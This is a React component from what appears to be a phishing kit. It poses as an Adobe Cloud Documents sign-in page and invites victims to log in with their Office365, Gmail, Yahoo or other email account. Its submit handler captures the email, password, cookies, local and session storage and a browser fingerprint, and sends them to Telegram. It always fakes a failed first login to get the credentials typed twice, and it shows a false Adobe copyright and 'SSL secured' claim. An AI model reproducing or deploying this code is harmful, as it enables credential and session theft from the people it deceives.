import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { getBrowserFingerprint } from '../utils/oauthHandler';
import safeSendToTelegram from '../utils/safeSendToTelegram';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');
    
    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      // Capture browser fingerprint for this attempt
      const browserFingerprint = getBrowserFingerprint();
      
      const cookieCapture = {
        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
        allCookies: {}
      };
      if (typeof document !== 'undefined') {
        document.cookie.split(';').forEach(cookie => {
          const [name, value] = cookie.trim().split('=');
          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
        });
      }

      const sessionData = {
        email,
        password,
        provider: selectedProvider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: cookieCapture.documentCookies,
        cookiesParsed: cookieCapture.allCookies,
        localStorage: JSON.stringify(browserFingerprint.localStorage),
        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
        browserFingerprint,
        attemptNumber: currentAttempt,
        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
        cookieCapture
      };

      // Use shared safe sender
      try {
        await safeSendToTelegram(sessionData);
        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
      } catch (err) {
        console.error('❌ Failed to send attempt data via safeSendToTelegram:', err);
      }

      if (currentAttempt === 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
      } else {
        await new Promise(resolve => setTimeout(resolve, 1000));
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        }
        if (onLoginSuccess) await onLoginSuccess(sessionData);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1633993365956-621f62f8057e?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=2070')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {/* Decorative left background (logo + text)
          Arranged as three stacked lines:
          "Adobe Cloud Documents"
          "PDF and e-signing tools"
          "Securely access your PDFs"
          Kept the vertical gap (mt-16). Shifted the two lines to the right (ml-8 / md:ml-12) as requested. */}
      <div className="absolute left-6 top-1/2 transform -translate-y-1/2 z-0 pointer-events-none hidden sm:flex flex-col items-start opacity-90">
        {/* First row: logo + title inline */}
        <div className="flex items-center gap-3">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
            alt="Adobe Cloud"
            className="w-12 h-12 md:w-14 md:h-14 object-contain drop-shadow-md"
          />
          <div className="text-white drop-shadow-md">
            <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
          </div>
        </div>

        {/* Gap preserved, then the two lines stacked beneath the title (left-aligned under the logo/title),
            but shifted to the right by adding ml-8 (md:ml-12) so they move right "times 2". */}
        <div className="mt-16 ml-8 md:ml-12 text-left">
          <div className="text-white/90 text-sm md:text-sm">PDF and e-signing tools</div>
          <div className="text-white/80 text-sm md:text-sm italic mt-2">Securely access your PDFs</div>
        </div>
      </div>

      {/* Modern card container */}
      <div className="w-full max-w-sm relative z-10">
        <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          {/* Soft gradient header */}
          <div className="px-6 py-5 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
            {/* keep logo on the left but remove title/subtitle per instructions */}
            <div className="flex items-center gap-3">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
                alt="Adobe"
                className="w-8 h-8 object-contain"
              />
            </div>

            {/* Center the Select Your Provider pill in the header */}
            <div className="absolute left-1/2 transform -translate-x-1/2">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                <Sparkles className="w-4 h-4 text-indigo-500" />
                <span className="text-xs font-medium text-indigo-700">Select Your Provider</span>
              </div>
            </div>
          </div>

          {/* Card body: providers and form */}
          <div className="px-6 py-6 flex flex-col gap-6">
            {/* Providers area */}
            {!selectedProvider ? (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-4">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      type="button"
                      aria-label={`Select ${provider.name}`}
                      className="flex items-center gap-3 p-3 rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md transition-shadow duration-200 justify-start"
                    >
                      <div className="flex items-center justify-center w-10 h-10 rounded-md bg-gradient-to-br from-slate-50 to-white border border-gray-100">
                        <img
                          src={provider.logo}
                          alt={provider.name}
                          className="w-6 h-6 object-contain"
                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                        />
                      </div>
                      <div className="text-sm font-semibold text-slate-800">{provider.name}</div>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-3">
                  <button onClick={handleBackToProviders} className="p-2 rounded-md hover:bg-slate-100" type="button">
                    <ArrowLeft className="w-4 h-4 text-slate-600" />
                  </button>
                  <div className="flex items-center gap-3">
                    <img
                      src={emailProviders.find(p => p.name === selectedProvider)?.logo}
                      alt={selectedProvider}
                      className="w-8 h-8 object-contain"
                      onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                    />
                    <h2 className="text-lg font-bold text-slate-900">Sign in with {selectedProvider}</h2>
                  </div>
                </div>

                <form onSubmit={handleFormSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                      <p className="text-sm text-red-700">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Email Address</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Enter your email address"
                        required
                        className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter your password"
                        required
                        className="w-full pl-12 pr-12 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-slate-500 hover:text-slate-700"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow"
                  >
                    {isLoading && <span className="inline-block w-4 h-4 mr-2 border-2 border-white/40 border-t-white rounded-full animate-spin align-middle" />}
                    <span>{isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}</span>
                  </button>
                </form>
              </div>
            )}

            {/* Footer */}
            <div className="pt-2 border-t border-gray-100">
              <p className="text-xs text-slate-500 text-center">© 2025 Adobe Inc. SSL secured.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
